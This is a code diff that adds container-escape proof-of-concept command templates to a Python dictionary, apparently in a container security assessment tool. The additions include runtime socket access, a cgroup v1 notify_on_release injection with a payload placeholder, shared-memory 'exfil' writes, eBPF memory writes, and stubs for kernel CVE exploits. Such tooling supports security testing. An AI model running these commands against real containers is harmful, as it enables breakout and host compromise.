@@ -88,6 +88,40 @@ POC_TEMPLATES: dict[str, str] = {
         "mkdir -p /mnt/host && mount /dev/{host_device} /mnt/host && "
         "ls /mnt/host"
     ),
+    "containerd_sock_mount": (
+        "# Access containerd via mounted socket\n"
+        "ctr -a /run/containerd/containerd.sock containers list"
+    ),
+    "crio_sock_mount": (
+        "# Access CRI-O via mounted socket\n"
+        "crictl --runtime-endpoint unix:///var/run/crio/crio.sock pods"
+    ),
+    "systemd_cgroup_injection": (
+        "# Inject systemd unit via writable cgroup v1\n"
+        "mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && "
+        "echo 1 > /tmp/cgrp/cgroup.clone_children && "
+        "mkdir /tmp/cgrp/x && echo $$ > /tmp/cgrp/x/cgroup.procs && "
+        "echo '{payload_command}' > /tmp/cgrp/x/notify_on_release"
+    ),
+    "tmpfs_shm_cross_container": (
+        "# Write to shared /dev/shm for cross-container exfil\n"
+        "echo 'exfil_data' > /dev/shm/shared_payload && "
+        "ls -la /dev/shm/"
+    ),
+    "proc_fd_symlink_traversal": (
+        "# Traverse /proc/self/fd symlinks to access host files\n"
+        "ls -la /proc/self/fd/ && "
+        "readlink /proc/self/fd/*"
+    ),
+    "device_mapper_access": (
+        "# Access device-mapper to manipulate block devices\n"
+        "dmsetup ls && dmsetup info"
+    ),
+    "vm_param_manipulation": (
+        "# Manipulate VM parameters to affect host memory management\n"
+        "echo 1 > /proc/sys/vm/drop_caches && "
+        "cat /proc/sys/vm/overcommit_memory"
+    ),
     # ── KERNEL ────────────────────────────────────────────────────
     "cve_2022_0185": (
         "# CVE-2022-0185 — FSConfig heap overflow\n"
@@ -132,6 +166,27 @@ POC_TEMPLATES: dict[str, str] = {
     "cve_2024_21626": (
         "# CVE-2024-21626 — runc process.cwd breakout\n"
         "# Exploit leaked fd to access host filesystem via /proc/self/fd/{leaked_fd}"
+    ),
+    "ebpf_probe_write_user": (
+        "# Use bpf_probe_write_user to write to host process memory\n"
+        "bpftool prog load /tmp/probe_write.o /sys/fs/bpf/pwn type tracepoint"
+    ),
+    "cve_2024_53104": (
+        "# CVE-2024-53104 — USB Video Class OOB write\n"
+        "# Requires USB device access for exploitation\n"
+        "/tmp/cve_2024_53104"
+    ),
+    "cve_2025_21756": (
+        "# CVE-2025-21756 — vsock use-after-free\n"
+        "/tmp/cve_2025_21756"
+    ),
+    "lsm_apparmor_unconfined": (
+        "# AppArmor is unconfined — no MAC restrictions\n"
+        "cat /proc/self/attr/current  # Should show 'unconfined'"
+    ),
+    "lsm_selinux_unconfined": (
+        "# SELinux is disabled/unconfined — no MAC restrictions\n"
+        "cat /proc/self/attr/current  # Check SELinux context"
     ),
     # ── RUNTIME ───────────────────────────────────────────────────
     "k8s_service_account": (
